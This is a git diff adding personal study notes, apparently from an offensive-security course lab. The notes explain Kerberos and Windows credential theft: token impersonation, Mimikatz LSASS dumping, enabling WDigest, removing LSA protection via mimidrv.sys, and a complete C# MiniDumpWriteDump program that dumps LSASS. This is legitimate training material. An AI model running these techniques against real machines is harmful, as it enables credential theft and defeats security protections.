@@ -732,6 +732,264 @@ or Empire SYSTEM shell.
 
 # fun with incognito
 
+We can also use meterpreter to obtain code execution in their context
+
+`load incognito`
+`help incognito`
+
+`list_tokens -u`
+`impersonate_token corp1\\admin`
+`getuid`
+
+### 12.2.3.1 Exercise
+1. Use a SYSTEM Meterpreter shell to list all tokens and impersonate a delegation token for the 
+domain user admin.
+
+# Kerberos and DOmain Credentials
+
+How kerberos is implemented in windows
+
+# Kerberos Authentication
+
+since 2003
+
+![](2022-08-29-05-37-59.png)
+
+When a user logs in, a request is sent to the Domain Controller. This DC serves as a KDC and runs 
+the Authentication Server service. The initial Authentication Server Request (AS_REQ) contains a 
+timestamp encrypted using a hash derived from the current user’s username and password.757
+When the service receives the request, it looks up the password hash associated with that user 
+and attempts to decrypt the timestamp. If the decryption process is successful and the 
+timestamp is not a duplicate (a potential replay attack), the authentication is considered 
+successful
+
+The service replies to the client with an Authentication Server Reply (AS_REP), which contains a 
+session key (since Kerberos is stateless) and a Ticket Granting Ticket (TGT). The session key is 
+encrypted using the user’s password hash, which the client could decrypt and reuse. The TGT 
+contains user information (including group memberships), the domain, a timestamp, the IP 
+address of the client, and the session key
+
+In order to avoid tampering, the TGT is encrypted by a secret key known only to the KDC and can 
+not be decrypted by the client. Once the client has received the session key and the TGT, the KDC 
+considers the client authentication complete. By default, the TGT will be valid for 10 hours. During 
+this time, the user is not required to retype the password and the TGT can be renewed without 
+entering the password.
+
+When the user attempts to access domain resources, such as a network share, Exchange 
+mailbox, or some other application with a registered Service Principal Name (SPN),758 the KDC is 
+contacted again.
+This time, the client constructs a Ticket Granting Service Request (TGS_REQ) packet that consists 
+of the current user and a timestamp (encrypted using the session key), the SPN of the resource, 
+and the encrypted TGT.
+
+Next, the ticket granting service on the KDC receives the TGS_REQ, and if the SPN exists in the 
+domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then 
+extracted from the decrypted TGT, and this key is used to decrypt the username and timestamp 
+of the request. If the TGT has a valid timestamp (no replay detected and the request has not 
+expired), the TGT and session key usernames match, and the origin and TGT IP addresses match, 
+the request is accepted.
+
+If this succeeds, the ticket granting service responds to the client with a Ticket Granting Server 
+Reply (TGS_REP). This packet contains three parts:
+1. The SPN to which access has been granted.
+2. A session key to be used between the client and the SPN.
+3. A service ticket containing the username and group memberships along with the newlycreated session key
+
+The first two parts (the SPN and session key) are encrypted using the session key associated 
+with the creation of the TGT and the service ticket is encrypted using the password hash of the 
+service account registered with the target SPN.
+Once the authentication process with the KDC is complete and the client has both a session key 
+and a service ticket, service authentication begins.
+
+First, the client sends an Application Request (AP_REQ), which includes the username and a 
+timestamp encrypted with the session key associated with the service ticket along with the 
+service ticket itself.
+The service decrypts the service ticket using its own password hash, extracts the session key 
+from it, and decrypts the supplied username. If the usernames match, the request is accepted. 
+Before access is granted, the service inspects the supplied group memberships in the service 
+ticket and assigns appropriate permissions to the user, after which the user may make use of the 
+service as required.
+This protocol may seem complicated and perhaps even convoluted, but it was designed to 
+mitigate various network attacks and prevent the use of fake credentials.
+
+# Mimikatz
+
+Due to the automatic renewal of TGTs, password hashes are cached in the Local Security 
+Authority Subsystem Service (LSASS) memory space.
+If we gain access to these hashes, we could crack them to obtain the clear text password or 
+reuse them to perform various actions (which we’ll discuss in a later module)
+
+Since LSASS is part of the operating system and runs as SYSTEM, we need SYSTEM (or local 
+administrator) permissions to gain access to the hashes stored on a target. In addition, the data 
+structures are not publicly documented and they are encrypted with an LSASS-stored key.
+
+However, as administrator, the offsec user can use SeDebugPrivilege762 to read and modify a 
+process under the ownership of a different user. To do this, we’ll use the Mimikatz 
+privilege::debug command to enable the SeDebugPrivilege by calling AdjustTokenPrivileges
+
+`mimikatz.exe`
+
+`privilege::debug`
+
+`sekurlsa::logonpasswords`
+
+The wdigest763 authentication protocol requires a clear text password, but it is 
+disabled in Windows 8.1 and newer. We can enable it by creating the 
+UseLogonCredential registry value in the path 
+`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`. Once we 
+set this value to “1”, the clear text password will be cached in LSASS after 
+subsequent logins.
+
+Against mimikatz- MS has developed LSA protection and Windows defender credential guard.
+
+There is something called Protected Processes Light. Which means that Processes running at SYSTEM integrity cannot tamper with proceseese in SYSTEM integrity along with PPL.
+
+LSASS supports PPL protection,
+766 which can be enabled in the registry. This is done through the 
+RunAsPPL DWORD value in HKLM\SYSTEM\CurrentControlSet\Control\Lsa with a value of 1.
+
+PPL protection is controlled by a bit residing in the EPROCESS kernel object associated with the 
+target process. If we could obtain code execution in kernel space, we could disable the LSA 
+protection and dump the credentials.
+Luckily, this can be achieved with Mimikatz since it comes bundled with the mimidrv.sys driver.
+
+We must be local administrator or SYSTEM to dump the credentials, which means we will also 
+have the SeLoadDriverPrivilege privilege and the ability to load any signed drivers. Mimikatz can 
+load the mimidrv.sys driver with the !+ command:
+
+`!+`
+
+once the driver is loaded we can use it to disable the PPL protection for LSASS through 
+
+`!processprotect /process:lsass.exe /remove`
+
+but loading of mimidrv.sys may triggr antivirus
+
+### 12.3.2.1 Exercises
+1. Log on to the Windows 10 victim VM as the offsec user and dump the cached credentials 
+with Mimikatz.
+2. Dump the cached credentials by calling the Mimikatz kiwi767 extension from Meterpreter.
+3. Log on to the Windows 2019 server appsrv01 as the admin user and attempt to dump the 
+cached credentials with Mimikatz.
+4. Use the Mimikatz driver to disable LSA Protection on appsrv01 and dump the credentials
+
+# processing credentials offline
+
+We can dump memeory section from taget's lsass.
+
+# memory Dump
+
+GUI - using task manager - find lsass.exe and create dump file
+
+When opening a dump file in Mimikatz, the target machine and the processing 
+machine must have a matching OS and architecture. For example, if the dumped 
+LSASS process was from a Windows 10 64-bit machine; we must also parse it on 
+a Windows 10 or Windows 2016/2019 64-bit machine. However, processing the 
+dump file requires neither an elevated command prompt nor privilege::debug
+
+
+we can use mimikatz for dumping
+
+`sekurlsa::minidump lsass.dump`
+
+`securlsa::logonpasswords`
+
+There is, however, one obvious disadvantage to this technique: Task Manager cannot be run as a 
+command line tool, so we’ll need GUI access to the target. Alternatively, we can create the dump 
+file from the command line with ProcDump769 from SysInternals
+
+### 12.4.1.1 Exercises
+1. Use Task Manager to create a dump file on your Windows 10 victim VM and parse it with 
+Mimikatz.
+2. Use ProcDump located in the C:\Tools\SysInternals folder to create a dump file and parse it 
+with Mimikatz
+
+# MiniDumpWriteDump
+
+Creating our own tool to create a dump
+
+we will use MiniDumpWriteDump
+
+```
+BOOL MiniDumpWriteDump(
+ HANDLE hProcess,
+ DWORD ProcessId,
+ HANDLE hFile,
+ MINIDUMP_TYPE DumpType,
+ PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
+ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
+ PMINIDUMP_CALLBACK_INFORMATION CallbackParam
+)
+```
+
+This function requires a lot of arguments, but only the first four are needed for our use case. The 
+first two arguments (hProcess and ProcessId) must be a handle to LSASS and the process ID of 
+LSASS, respectively.
+The third argument (hFile) is a handle to the file that will contain the generated memory dump, 
+and the fourth (DumpType) is an enumeration type771 that we’ll set to MiniDumpWithFullMemory
+(or its numerical value of “2”) to obtain a full memory dump
+
+## Full program for lsass dump
+
+```C#
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+namespace MiniDump
+{
+    class Program
+    {
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
+        IntPtr hFile, int DumpType, IntPtr ExceptionParam,
+        IntPtr UserStreamParam, IntPtr CallbackParam);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
+        int processId);
+        static void Main(string[] args)
+        {
+            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp",
+           FileMode.Create);
+            Process[] lsass = Process.GetProcessesByName("lsass");
+            int lsass_pid = lsass[0].Id;
+            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
+            bool dumped = MiniDumpWriteDump(handle, lsass_pid,
+           dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero,
+           IntPtr.Zero);
+        }
+    }
+}
+```
+
+then call miikatz,
+
+`sekurlsa::minidump lsass.dmp`
+
+`sekurlsa::logonpasswords`
+
+### 12.4.2.1 Exercises
+1. Write and compile a C# application that creates a dump file from LSASS as shown in this 
+section.
+2. Create a PowerShell script that calls MiniDumpWriteDump to create a dump file
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
